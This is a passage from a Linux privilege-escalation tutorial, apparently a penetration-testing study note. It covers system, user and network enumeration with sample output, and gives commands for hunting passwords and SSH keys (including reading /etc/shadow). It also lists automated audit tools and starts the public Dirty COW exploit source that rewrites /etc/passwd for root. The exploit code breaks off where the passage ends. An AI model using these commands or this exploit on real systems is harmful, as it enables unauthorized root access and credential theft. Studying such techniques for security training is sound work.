# Privilege escalation on linux
## Some useful links to other collections of stuff good to know when you want to get better permissions.
[g0tm1lk blog - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
[PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[hacktricks - privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
[sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

When you get access to a new system you need to start look around to get a hold of what you can use to escalate your privileges.
Here are some methods you can start with.

- [Privilege escalation on linux](#privilege-escalation-on-linux)
  - [system enumeration](#system-enumeration)
  - [user enumeration](#user-enumeration)
  - [network enumeration](#network-enumeration)
  - [password enumeration](#password-enumeration)
  - [Automated tools](#automated-tools)
  - [Escalation via Kernel Exploits](#escalation-via-kernel-exploits)
  - [Escalation via Stored Passwords](#escalation-via-stored-passwords)
  - [Escalation via Weak File Permissions](#escalation-via-weak-file-permissions)
  - [Escalation via SSH Keys](#escalation-via-ssh-keys)
  - [Escalation via Sudo Shell Escaping](#escalation-via-sudo-shell-escaping)
  - [Escalation via Intended Functionality](#escalation-via-intended-functionality)
  - [Escalation via LD_PRELOAD](#escalation-via-ld_preload)
  - [CVE-2019-14287](#CVE-2019-14287)
  - [CVE-2019-18634](#CVE-2019-18634)
  - [SUID](#suid)
## system enumeration
Build yourself an image about the system you are on.
Start by getting the name  
`hostame`
``` bash
$ hostname
hackbox
```
Next, get information about the kernel  
`uname -a`
``` bash
$ uname -a
Linux hackbox 6.5.0-25-generic #25-Ubuntu SMP PREEMPT_DYNAMIC Wed Feb  7 14:58:39 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```
`cat /proc/version`  
``` bash
$ cat /proc/version
Linux version 6.5.0-25-generic (buildd@lcy02-amd64-054) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-4ubuntu3) 13.2.0, GNU ld (GNU Binutils for Ubuntu) 2.41) #25-Ubuntu SMP PREEMPT_DYNAMIC Wed Feb  7 14:58:39 UTC 2024
```

What operatingsystem are you on  
`cat /etc/issue`
``` bash
$ cat /etc/issue
Ubuntu 23.10 \n \l
```
Get information about the CPU  
`lscpu`
``` bash
$ lscpu
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         39 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  4
  On-line CPU(s) list:   0-3
Vendor ID:               GenuineIntel
  Model name:            Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz
    CPU family:          6
    Model:               78
    Thread(s) per core:  2
    Core(s) per socket:  2
    Socket(s):           1
    Stepping:            3
    CPU(s) scaling MHz:  71%
    CPU max MHz:         2800.0000
    CPU min MHz:         400.0000
    BogoMIPS:            4800.00
    Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc a
                         rt arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid ss
                         e4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti ssbd ibrs ibpb stibp tpr_
                         shadow flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid mpx rdseed adx smap clflushopt intel_pt xsaveopt xsavec xgetbv1 xsaves dth
                         erm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp vnmi md_clear flush_l1d arch_capabilities
Virtualization features: 
  Virtualization:        VT-x
Caches (sum of all):     
  L1d:                   64 KiB (2 instances)
  L1i:                   64 KiB (2 instances)
  L2:                    512 KiB (2 instances)
  L3:                    3 MiB (1 instance)
NUMA:                    
  NUMA node(s):          1
  NUMA node0 CPU(s):     0-3
Vulnerabilities:         
  Gather data sampling:  Vulnerable: No microcode
  Itlb multihit:         KVM: Mitigation: VMX disabled
  L1tf:                  Mitigation; PTE Inversion; VMX conditional cache flushes, SMT vulnerable
  Mds:                   Mitigation; Clear CPU buffers; SMT vulnerable
  Meltdown:              Mitigation; PTI
  Mmio stale data:       Mitigation; Clear CPU buffers; SMT vulnerable
  Retbleed:              Mitigation; IBRS
  Spec rstack overflow:  Not affected
  Spec store bypass:     Mitigation; Speculative Store Bypass disabled via prctl
  Spectre v1:            Mitigation; usercopy/swapgs barriers and __user pointer sanitization
  Spectre v2:            Mitigation; IBRS, IBPB conditional, STIBP conditional, RSB filling, PBRSB-eIBRS Not affected
  Srbds:                 Mitigation; Microcode
  Tsx async abort:       Not affected
```
Check services and who is running what  
`ps aux`
``` bash
$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.0 169680 13332 ?        Ss   21:47   0:02 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    21:47   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   21:47   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   21:47   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   21:47   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   21:47   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   21:47   0:00 [kworker/0:0H-events_highpri]
root           9  0.0  0.0      0     0 ?        I    21:47   0:00 [kworker/0:1-events]
root          11  0.0  0.0      0     0 ?        I<   21:47   0:00 [mm_percpu_wq]
root          12  0.0  0.0      0     0 ?        I    21:47   0:00 [rcu_tasks_kthread]
root          13  0.0  0.0      0     0 ?        I    21:47   0:00 [rcu_tasks_rude_kthread]
root          14  0.0  0.0      0     0 ?        I    21:47   0:00 [rcu_tasks_trace_kthread]
root          15  0.0  0.0      0     0 ?        S    21:47   0:00 [ksoftirqd/0]
root          16  0.1  0.0      0     0 ?        I    21:47   0:03 [rcu_preempt]
root          17  0.0  0.0      0     0 ?        S    21:47   0:00 
...
mattias    90093  0.0  0.0   2776  1792 ?        S    22:16   0:00 /bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 45069
mattias    90094  0.0  0.0   9904  3328 ?        S    22:16   0:00 /bin/bash /usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 45069
mattias    90097  0.0  0.0   8256  1920 ?        S    22:16   0:00 sleep 1
mattias    90098  152  0.2 7024780 41856 ?       Sl   22:16   0:00 /home/mattias/.vscode/extensions/redhat.java-1.28.1-linux-x64/jre/17.0.10-linux-x86_64/bin/jcmd 44736 VM.uptime
mattias    90118  200  0.0  14144  4864 pts/0    R+   22:16   0:00 ps aux
```

## user enumeration
When you know some stuff about the system, look for things you user can do.  
Who is your user?  
`whoami`
``` bash
$ whoami
mattias
```
Which groups do you belong to?  
`id`
``` bash
$ id
uid=1000(mattias) gid=1000(mattias) groups=1000(mattias),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin),991(nordvpn)
```
Which commands can you run as sudo?  
`sudo -l`
``` bash
$ sudo -l
Matching Defaults entries for mattias on hackbox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mattias may run the following commands on hackbox:
    (ALL : ALL) ALL
```
Check if you can read some important files
* `/etc/passwd`
* `/etc/shadow`
* `/etc/group`
``` bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
syslog:x:101:107::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:102:108::/run/uuidd:/usr/sbin/nologin
tss:x:103:110:TPM software stack,,,:/var/lib/tpm:/bin/false
systemd-oom:x:995:995:systemd Userspace OOM Killer:/:/usr/sbin/nologin
tcpdump:x:104:113::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
kernoops:x:107:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
whoopsie:x:108:115::/nonexistent:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:111:118:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
rtkit:x:112:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
sssd:x:113:120:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
fwupd-refresh:x:115:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
nm-openvpn:x:116:123:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:117:125::/var/lib/saned:/usr/sbin/nologin
colord:x:118:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:119:127::/var/lib/geoclue:/usr/sbin/nologin
gdm:x:120:128:Gnome Display Manager:/var/lib/gdm3:/bin/false
cups-browsed:x:121:118::/nonexistent:/usr/sbin/nologin
gnome-initial-setup:x:122:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:123:7:HPLIP system user,,,:/run/hplip:/bin/false
mattias:x:1000:1000:Mattias:/home/mattias:/bin/bash
dhcpcd:x:124:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:992:992:polkit:/nonexistent:/usr/sbin/nologin

$ cat /etc/shadow
cat: /etc/shadow: Permission denied

$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,mattias
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:mattias
floppy:x:25:
tape:x:26:
sudo:x:27:mattias
audio:x:29:
dip:x:30:mattias
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:mattias
staff:x:50:
games:x:60:
users:x:100:mattias
nogroup:x:65534:
systemd-journal:x:999:
systemd-network:x:998:
crontab:x:101:
systemd-timesync:x:997:
input:x:102:
sgx:x:103:
kvm:x:104:
render:x:105:
messagebus:x:106:
syslog:x:107:
systemd-resolve:x:996:
uuidd:x:108:
_ssh:x:109:
tss:x:110:
bluetooth:x:111:
ssl-cert:x:112:
systemd-oom:x:995:
tcpdump:x:113:
avahi-autoipd:x:114:
whoopsie:x:115:
avahi:x:116:
netdev:x:117:
lpadmin:x:118:mattias
rtkit:x:119:
sssd:x:120:
pipewire:x:121:
fwupd-refresh:x:122:
nm-openvpn:x:123:
scanner:x:124:saned
saned:x:125:
colord:x:126:
geoclue:x:127:
gdm:x:128:
lxd:x:129:
gamemode:x:994:
gnome-initial-setup:x:993:
mattias:x:1000:
vboxusers:x:130:
polkitd:x:992:
plocate:x:131:
nordvpn:x:991:mattias
```
If you want to see only user information you could use this  
visa endast username  
`cat /etc/passwd | cut -d : -f 1`
``` bash
$ cat /etc/passwd | cut -d : -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
_apt
nobody
systemd-network
systemd-timesync
messagebus
syslog
systemd-resolve
uuidd
tss
systemd-oom
tcpdump
avahi-autoipd
usbmux
kernoops
whoopsie
dnsmasq
avahi
cups-pk-helper
rtkit
sssd
speech-dispatcher
fwupd-refresh
nm-openvpn
saned
colord
geoclue
gdm
cups-browsed
gnome-initial-setup
hplip
mattias
dhcpcd
polkitd
```
This is acctually good to start with, check what the user have been doing. Maybe you can find a password or other good stuff  
`history | more`

``` bash
$ history | more
 1029  netstat -r
 1030  ip xfrm state
 1031  sudo ip xfrm state
 1032  sudo ip xfrm frame
 1033  sudo ip xfrm policy
 1034  sudo ip rule show
 1035  sudo ip route list table local
 1036  sudo ip route list table main
 1037  sudo ip route list table default
 1038  ll
--More--
```

## network enumeration
Now it is time to get some information about the network.  
First out is the IP. Here it depends a bit on the system. Some have one of these commands, some both...

`ifconfig` 
```bash
$ ifconfig
enp0s31f6: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether c8:d3:ff:6a:5e:e5  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  memory 0xe1200000-e1220000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2381  bytes 215698 (215.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2381  bytes 215698 (215.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlp2s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.151  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::80d5:bbaf:4549:a003  prefixlen 64  scopeid 0x20<link>
        ether f0:d5:bf:01:7c:91  txqueuelen 1000  (Ethernet)
        RX packets 11377658  bytes 17202517468 (17.2 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1291633  bytes 123636080 (123.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
``` 
`ip a`
``` bash
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s31f6: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
    link/ether c8:d3:ff:6a:5e:e5 brd ff:ff:ff:ff:ff:ff
3: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether f0:d5:bf:01:7c:91 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.151/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp2s0
       valid_lft 39929sec preferred_lft 39929sec
    inet6 fe80::80d5:bbaf:4549:a003/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```
how are the network route set up?  
`ip route`
```bash 
$ ip route
default via 192.168.1.1 dev wlp2s0 proto dhcp src 192.168.1.151 metric 600 
169.254.0.0/16 dev wlp2s0 scope link metric 1000 
192.168.1.0/24 dev wlp2s0 proto kernel scope link src 192.168.1.151 metric 600
```
`netstat -r`
```bash
$ netstat -r
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         amplifi.lan     0.0.0.0         UG        0 0          0 wlp2s0
link-local      0.0.0.0         255.255.0.0     U         0 0          0 wlp2s0
192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 wlp2s0 
```
What can you find around you?  
`arp -a`
``` bash
$ arp -a
OnePlus-7T.lan (192.168.1.134) at 9e:3e:c4:85:d9:0a [ether] on wlp2s0
RE450.lan (192.168.1.135) at b6:4e:26:a8:60:3d [ether] on wlp2s0
AFi-P-HD-AC8982.lan (192.168.1.130) at f0:9f:c2:ac:89:82 [ether] on wlp2s0
? (192.168.1.128) at 7a:c3:56:7d:b0:9a [ether] on wlp2s0
DEFAULT.lan (192.168.1.116) at d4:d2:d6:a9:b8:88 [ether] on wlp2s0
cola (192.168.1.15) at b6:4e:26:a8:60:3d [ether] on wlp2s0
? (192.168.1.226) at 68:b9:d3:0f:17:85 [ether] on wlp2s0
? (192.168.1.248) at 98:41:5c:20:48:e9 [ether] on wlp2s0
ESP_85E49C.lan (192.168.1.173) at 9c:9c:1f:85:e4:9c [ether] on wlp2s0
OnePlus-Nord-3-5G.lan (192.168.1.247) at c2:b1:f3:f3:d3:d9 [ether] on wlp2s0
amplifi.lan (192.168.1.1) at f2:9f:c2:02:e2:11 [ether] on wlp2s0
Apple-TV.lan (192.168.1.167) at d0:03:4b:31:27:20 [ether] on wlp2s0
quilmes (192.168.1.20) at e4:5f:01:a4:8c:0b [ether] on wlp2s0
AirsomtrPaulina.lan (192.168.1.197) at b0:4e:26:a8:60:3c [ether] on wlp2s0
GW-58D50AB3A763.lan (192.168.1.111) at b6:4e:26:a8:60:3d [ether] on wlp2s0
? (192.168.1.219) at 64:90:c1:0a:2d:65 [ether] on wlp2s0
```
`ip neigh`
``` bash
$ ip neigh
192.168.1.134 dev wlp2s0 lladdr 9e:3e:c4:85:d9:0a STALE 
192.168.1.135 dev wlp2s0 lladdr b6:4e:26:a8:60:3d STALE 
192.168.1.130 dev wlp2s0 lladdr f0:9f:c2:ac:89:82 STALE 
192.168.1.128 dev wlp2s0 lladdr 7a:c3:56:7d:b0:9a STALE 
192.168.1.116 dev wlp2s0 lladdr d4:d2:d6:a9:b8:88 STALE 
192.168.1.15 dev wlp2s0 lladdr b6:4e:26:a8:60:3d STALE 
192.168.1.226 dev wlp2s0 lladdr 68:b9:d3:0f:17:85 STALE 
192.168.1.248 dev wlp2s0 lladdr 98:41:5c:20:48:e9 STALE 
192.168.1.173 dev wlp2s0 lladdr 9c:9c:1f:85:e4:9c STALE 
192.168.1.247 dev wlp2s0 lladdr c2:b1:f3:f3:d3:d9 STALE 
192.168.1.1 dev wlp2s0 lladdr f2:9f:c2:02:e2:11 REACHABLE 
192.168.1.167 dev wlp2s0 lladdr d0:03:4b:31:27:20 STALE 
192.168.1.20 dev wlp2s0 lladdr e4:5f:01:a4:8c:0b STALE 
192.168.1.197 dev wlp2s0 lladdr b0:4e:26:a8:60:3c STALE 
192.168.1.111 dev wlp2s0 lladdr b6:4e:26:a8:60:3d STALE 
192.168.1.219 dev wlp2s0 lladdr 64:90:c1:0a:2d:65 STALE 
```
`nmap -sn 192.168.1.0/24`

``` bash
$ nmap -sn 192.168.1.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 22:47 CET
Nmap scan report for amplifi.lan (192.168.1.1)
Host is up (0.0051s latency).
Nmap scan report for cola (192.168.1.15)
Host is up (0.0032s latency).
Nmap scan report for quilmes (192.168.1.20)
Host is up (0.0098s latency).
Nmap scan report for GW-58D50AB3A763.lan (192.168.1.111)
Host is up (0.012s latency).
Nmap scan report for 192.168.1.128
Host is up (0.11s latency).
Nmap scan report for AFi-P-HD-AC8982.lan (192.168.1.130)
Host is up (0.0020s latency).
Nmap scan report for RE450.lan (192.168.1.135)
Host is up (0.0071s latency).
Nmap scan report for hackbox.lan (192.168.1.151)
Host is up (0.00011s latency).
Nmap scan report for Apple-TV.lan (192.168.1.167)
Host is up (0.0086s latency).
Nmap scan report for ESP_85E49C.lan (192.168.1.173)
Host is up (0.0044s latency).
Nmap scan report for 192.168.1.219
Host is up (0.0086s latency).
Nmap scan report for OnePlus-Nord-3-5G.lan (192.168.1.247)
Host is up (0.045s latency).
Nmap done: 256 IP addresses (12 hosts up) scanned in 4.51 seconds
```
Check for connections by systems or users
`netstat -ano`
``` bash
$ netstat -ano | more
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:902             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 192.168.1.151:43892     140.82.121.3:22         TIME_WAIT   timewait (53.95/0/0)
tcp        0      0 192.168.1.151:43868     3.68.63.139:443         ESTABLISHED keepalive (29.34/0/0)
tcp        0      0 192.168.1.151:43924     140.82.121.3:22         TIME_WAIT   timewait (56.64/0/0)
tcp        0      0 192.168.1.151:50576     37.46.190.105:7443      ESTABLISHED keepalive (6.42/0/0)
tcp        0      0 192.168.1.151:40002     140.82.121.3:22         TIME_WAIT   timewait (53.19/0/0)
tcp        0      0 192.168.1.151:39976     140.82.121.3:22         TIME_WAIT   timewait (53.14/0/0)
tcp        0      0 192.168.1.151:39994     140.82.121.3:22         TIME_WAIT   timewait (53.35/0/0)
tcp        0      0 192.168.1.151:34708     152.199.19.160:443      ESTABLISHED keepalive (19.66/0/0)
tcp        0      0 192.168.1.151:59448     3.67.131.16:443         ESTABLISHED keepalive (16.39/0/0)
```
## password enumeration
There is a great chance that passwords are saved in places they should not. 

Here are some commands that can be used for find passwords    
`grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`  
Uses grep to look through all files and color code the result. Change the grep to look for passwd, pass, pwd etc

Look for files names password  
`locate password | more`  
Change to whatever you can find out that could be a password file  

Look for ssh-keys  
`find / -name id_rsa 2> /dev/null`  
Try with other commonly used filenames.

## Automated tools
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 
``` bash
$ ./LinPEAS.sh -h
Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -a Perform all checks: 1 min of processes, su brute, and extra checks.
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -t Automatic network scan & Internet conectivity checks - This option writes to files
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
	    -D Debug mode

        Network recon:
            -t Automatic network scan & Internet conectivity checks - This option writes to files
	    -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding (reverse connection):
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)

        Firmware recon:
            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
	    -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
	    -q Do not show banner
            -N Do not use colours
```
[LinEnum](https://github.com/rebootuser/LinEnum)
```bash 
$ ./LinEnum.sh -h
./LinEnum.sh: option requires an argument -- h

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com | @rebootuser 
# version 0.982

# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t 

OPTIONS:
-k	Enter keyword
-e	Enter export location
-s 	Supply user password for sudo checks (INSECURE)
-t	Include thorough (lengthy) tests
-r	Enter report name
-h	Displays this help text


Running with no options = limited scans/no output file
#########################################################
```
[linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
``` bash
$ ./linux-exploit-suggester.sh -h
LES ver. v1.1 (https://github.com/mzet-/linux-exploit-suggester) by @_mzet_

Usage: linux-exploit-suggester.sh [OPTIONS]

 -V | --version               - print version of this script
 -h | --help                  - print this help
 -k | --kernel <version>      - provide kernel version
 -u | --uname <string>        - provide 'uname -a' string
 --skip-more-checks           - do not perform additional checks (kernel config, sysctl) to determine if exploit is applicable
 --skip-pkg-versions          - skip checking for exact userspace package version (helps to avoid false negatives)
 -p | --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' command output
 --cvelist-file <file>        - provide file with Linux kernel CVEs list
 --checksec                   - list security related features for your HW/kernel
 -s | --fetch-sources         - automatically downloads source for matched exploit
 -b | --fetch-binaries        - automatically downloads binary for matched exploit if available
 -f | --full                  - show full info about matched exploit
 -g | --short                 - show shorten info about matched exploit
 --kernelspace-only           - show only kernel vulnerabilities
 --userspace-only             - show only userspace vulnerabilities
 -d | --show-dos              - show also DoSes in results
```

[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
``` bash
$ python linuxprivchecker.py -h
usage: linuxprivchecker.py [-h] [-s] [-w] [-o OUTFILE]

Try to gather system information and find likely exploits

options:
  -h, --help            show this help message and exit
  -s, --searches        Skip time consumming or resource intensive searches
  -w, --write           Wether to write a log file, can be used with -0 to specify name/location
  -o OUTFILE, --outfile OUTFILE
                        The file to write results (needs to be writable for current user)
```

## Escalation via Kernel Exploits
First get the kernel version. This can be done by the command previously shown
``` bash
$ uname -a
Linux hackbox 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```
Then try to google it and you might find some result like this
https://www.exploit-db.com/exploits/40839

``` c
//
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
//

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

